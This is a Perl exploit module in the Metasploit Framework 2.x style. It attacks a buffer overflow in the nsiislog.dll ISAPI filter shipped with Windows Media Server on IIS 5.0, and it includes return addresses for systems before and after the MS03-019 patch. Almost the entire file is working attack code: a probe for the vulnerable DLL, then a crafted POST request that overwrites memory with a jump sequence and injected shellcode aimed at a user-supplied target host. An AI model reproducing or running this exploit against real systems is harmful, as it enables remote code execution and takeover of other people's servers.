package Msf::Exploit::iis50_nsiislog_post;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'IIS 5.0 nsiislog.dll POST Overflow',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win2000', 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Size'  => 1024,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
                 },
    
    'Description'  =>  "This exploits a buffer overflow found in the nsiislog.dll ISAPI ".
                       "filter that comes with Windows Media Server. This module will ".
                       "also work against the 'patched' MS03-019 version.",
    
    'Refs'  =>  [  
                    'http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0120.html'
                ],
    'Targets' => [
                   ['Windows 2000 Pre-MS03-019',   9769, 0x40f01333],
                   ['Windows 2000 Post-MS03-019', 13869, 0x40f01353],
                 ],
);

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => \%info}, @_);
    return $self;
}

sub Check {
    my ($self, $opt) = @_;  
    my $s = Pex::Socket->new( {"SSL" => $opt->{"SSL"}} );
    if (! $s->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
    {
        return "Error: " . $s->get_error() . "\n";
    }
 
    $s->send("GET /scripts/nsiislog.dll HTTP/1.1\r\nHost: " . $opt->{"RHOST"} . ":" . $opt->{"RPORT"} . "\r\n\r\n");

    my $r = $s->recv(5);

    if ($r =~ /NetShow ISAPI/)
    {
        return "Found /scripts/nsiislog.dll :)";
    } else {
        return "The nsiislog.dll ISAPI does not appear to be installed.";
    }
}


sub Exploit {
    my ($self, $opt) = @_;

    select(STDOUT);$|++;

    my $target_host = $opt->{"RHOST"};
    my $target_port = $opt->{"RPORT"};
    my $shellcode   = $opt->{"SHELLCODE"};

    my @targets = @{$self->{'Info'}->{'Targets'}};
    @targets = defined($opt->{'TARGET'}) ? ($targets[$opt->{'TARGET'}]) : @targets;

    foreach my $target (@targets)
    {
        print "\n[*] Attempting to exploit target " . $target->[0] . "\n";

        my $request = 
        "POST /scripts/nsiislog.dll HTTP/1.1\r\n".
        "Host: " . $opt->{"RHOST"} . ":" . $opt->{"RPORT"} . "\r\n".
        "User-Agent: NSPlayer/2.0\r\n".
        "Content-Type: application/x-www-form-urlencoded\r\n";

        my @fields = split(/\s+/, "date time c-dns cs-uri-stem c-starttime ".
                                  "x-duration c-rate c-status c-playerid c-playerversion ".
                                  "c-playerlanguage cs(User-Agent) cs(Referer) c-hostexe ");                         
        my $boom;
        foreach my $var (@fields) { $boom .= "$var=BOOM&"; }

        my $pattern = "M" x 65535;
        
        # print "Offsets: " . join(" ", Pex::PatternOffset($pattern, 0x12345678)) . "\n";

        substr($pattern, $target->[1],  4, pack("L", $target->[2]));
        substr($pattern, $target->[1] - 4, 4, "\xeb\x08\xeb\x08");
        substr($pattern, $target->[1] + 4, length($shellcode), $shellcode);

        $boom .= "c-ip=" . $pattern;
        $request .= "Content-Length: " . length($boom) . "\r\n\r\n" . $boom;
        
        my $s = Pex::Socket->new({"SSL" => $opt->{"SSL"}});
        if (! $s->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
        {
            print "[*] Error: could not connect: " . $s->get_error() . "\n";
            exit(0);
        }

        print "[*] Sending " .length($request) . " bytes to remote host.\n";
        $s->send($request);
        
        print "[*] Waiting for a response...\n";
        my $r = $s->recv(5);
        sleep(2);
        $s->close();
    }
    
    exit(0);
}
1;
